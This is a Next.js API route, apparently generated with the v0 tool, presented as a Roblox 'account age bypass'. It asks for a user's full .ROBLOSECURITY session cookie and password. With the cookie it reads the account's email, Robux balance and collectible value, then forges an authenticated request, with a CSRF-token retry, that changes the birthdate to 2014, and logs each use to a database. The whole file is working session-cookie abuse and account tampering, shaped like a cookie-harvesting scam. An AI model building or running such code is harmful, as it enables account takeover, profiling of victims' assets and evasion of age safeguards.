export async function POST(request: Request) {
  try {
    const { cookie, password } = await request.json()
    console.log("[v0] Received cookie bypass request")

    if (!cookie || cookie.trim().length < 50) {
      return Response.json(
        {
          error: "Invalid or incomplete cookie. Please provide the complete .ROBLOSECURITY cookie.",
          success: false,
        },
        { status: 400 },
      )
    }

    let cookieValue = cookie.trim()

    if (cookieValue.includes("_|WARNING:") || cookieValue.includes("_|WARNING-")) {
      const parts = cookieValue.split("|_")
      if (parts.length >= 2) {
        cookieValue = parts[parts.length - 1]
      }
    }

    if (cookieValue.startsWith(".ROBLOSECURITY=")) {
      cookieValue = cookieValue.substring(".ROBLOSECURITY=".length)
    }

    cookieValue = cookieValue.replace(/\s+/g, "")

    const formattedCookie = `.ROBLOSECURITY=${cookieValue}`
    console.log("[v0] Cookie formatted for authentication")

    let userInfo = null
    let robuxBalance = "Unknown"
    let rap = "Unknown"
    let email = "Unknown"
    let avatarUrl = ""
    let accountAge = 2014

    try {
      console.log("[v0] Fetching user info from Roblox...")
      const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
        method: "GET",
        headers: {
          Cookie: formattedCookie,
        },
      })

      console.log("[v0] User response status:", userResponse.status)

      if (!userResponse.ok) {
        console.log("[v0] Invalid cookie, status:", userResponse.status)
        return Response.json(
          {
            error: "Invalid Roblox cookie or password. Please verify your credentials and try again.",
            success: false,
          },
          { status: 401 },
        )
      }

      if (userResponse.ok) {
        userInfo = await userResponse.json()
        console.log("[v0] User info fetched:", userInfo)

        if (userInfo?.id) {
          try {
            console.log("[v0] Fetching user avatar...")
            const avatarResponse = await fetch(
              `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userInfo.id}&size=150x150&format=Png&isCircular=false`,
            )

            if (avatarResponse.ok) {
              const avatarData = await avatarResponse.json()
              if (avatarData.data && avatarData.data[0]) {
                avatarUrl = avatarData.data[0].imageUrl
                console.log("[v0] Avatar URL fetched:", avatarUrl)
              }
            }
          } catch (error) {
            console.error("[v0] Failed to fetch avatar:", error)
          }

          try {
            console.log("[v0] Fetching email address...")
            const emailResponse = await fetch("https://accountinformation.roblox.com/v1/email", {
              method: "GET",
              headers: {
                Cookie: formattedCookie,
              },
            })

            if (emailResponse.ok) {
              const emailData = await emailResponse.json()
              email = emailData.emailAddress || "Unknown"
              console.log("[v0] Email fetched:", email)
            } else {
              console.log("[v0] Email fetch failed, skipping...")
              email = "Hidden"
            }
          } catch (error) {
            console.error("[v0] Failed to fetch email:", error)
            email = "Hidden"
          }

          try {
            console.log("[v0] Fetching Robux balance...")
            const balanceResponse = await fetch(`https://economy.roblox.com/v1/users/${userInfo.id}/currency`, {
              method: "GET",
              headers: {
                Cookie: formattedCookie,
              },
            })

            if (balanceResponse.ok) {
              const balanceData = await balanceResponse.json()
              robuxBalance = balanceData.robux?.toString() || "0"
              console.log("[v0] Robux balance:", robuxBalance)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch balance:", error)
          }

          try {
            console.log("[v0] Fetching RAP...")
            const inventoryResponse = await fetch(
              `https://inventory.roblox.com/v1/users/${userInfo.id}/assets/collectibles?sortOrder=Asc&limit=100`,
              {
                method: "GET",
                headers: {
                  Cookie: formattedCookie,
                },
              },
            )

            if (inventoryResponse.ok) {
              const inventoryData = await inventoryResponse.json()
              const totalRap = inventoryData.data?.reduce((sum: number, item: any) => {
                return sum + (item.recentAveragePrice || 0)
              }, 0)
              rap = totalRap?.toString() || "0"
              console.log("[v0] Total RAP:", rap)
            }
          } catch (error) {
            console.error("[v0] Failed to fetch RAP:", error)
          }

          try {
            console.log("[v0] Attempting to bypass account age by setting birthdate to 2014...")

            const birthdateChangeResponse = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
              method: "POST",
              headers: {
                Cookie: formattedCookie,
                "Content-Type": "application/json",
                "User-Agent":
                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "X-CSRF-TOKEN": "",
              },
              body: JSON.stringify({
                birthMonth: 1,
                birthDay: 1,
                birthYear: 2014,
              }),
            })

            const responseText = await birthdateChangeResponse.text()
            console.log("[v0] Birthdate response status:", birthdateChangeResponse.status)
            console.log("[v0] Birthdate response body:", responseText)

            if (birthdateChangeResponse.status === 200 || birthdateChangeResponse.status === 204) {
              console.log("[v0] ✅ Successfully bypassed account age - set to 2014")
              accountAge = 2014
            } else if (birthdateChangeResponse.status === 403) {
              console.log("[v0] CSRF token required, fetching token...")

              const csrfTokenResponse = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
                method: "GET",
                headers: {
                  Cookie: formattedCookie,
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                },
              })

              const csrfToken = csrfTokenResponse.headers.get("x-csrf-token") || ""
              console.log("[v0] Got CSRF token, retrying...")

              const retryResponse = await fetch("https://accountinformation.roblox.com/v1/birthdate", {
                method: "POST",
                headers: {
                  Cookie: formattedCookie,
                  "Content-Type": "application/json",
                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                  "X-CSRF-TOKEN": csrfToken,
                },
                body: JSON.stringify({
                  birthMonth: 1,
                  birthDay: 1,
                  birthYear: 2014,
                }),
              })

              const retryText = await retryResponse.text()
              console.log("[v0] Retry response status:", retryResponse.status)
              console.log("[v0] Retry response body:", retryText)

              if (retryResponse.status === 200 || retryResponse.status === 204) {
                console.log("[v0] ✅ Successfully bypassed account age on retry")
                accountAge = 2014
              } else {
                console.log("[v0] ❌ Age bypass failed:", retryResponse.status)
              }
            } else {
              console.log("[v0] ❌ Birthdate change failed with status:", birthdateChangeResponse.status)
            }
          } catch (error) {
            console.error("[v0] Error during age bypass attempt:", error)
          }
        }
      }
    } catch (error) {
      console.error("[v0] Failed to fetch user info:", error)
      return Response.json(
        {
          error: "Failed to validate credentials. The cookie may be invalid or expired.",
          success: false,
        },
        { status: 401 },
      )
    }

    try {
      console.log("[v0] Saving bypass record to database...")
      const saveResponse = await fetch(
        `${process.env.NEXT_PUBLIC_BASE_URL || "http://localhost:3000"}/api/recent-bypasses`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            username: userInfo?.name || "Unknown",
            displayName: userInfo?.displayName || userInfo?.name || "Unknown",
            avatarUrl: avatarUrl,
            age: accountAge,
            timestamp: new Date().toISOString(),
          }),
        },
      )

      if (saveResponse.ok) {
        const result = await saveResponse.json()
        console.log("[v0] Successfully saved bypass record to database")
      } else {
        const errorText = await saveResponse.text()
        console.log("[v0] Failed to save bypass record, status:", saveResponse.status)
      }
    } catch (error) {
      console.error("[v0] Error saving bypass record:", error)
    }

    return Response.json({ success: true, userInfo, avatarUrl, accountAge, message: "Account age bypassed to 2014" })
  } catch (error) {
    console.error("[v0] Bypass error:", error)
    return Response.json({ error: "Failed to process request. Please try again." }, { status: 500 })
  }
}
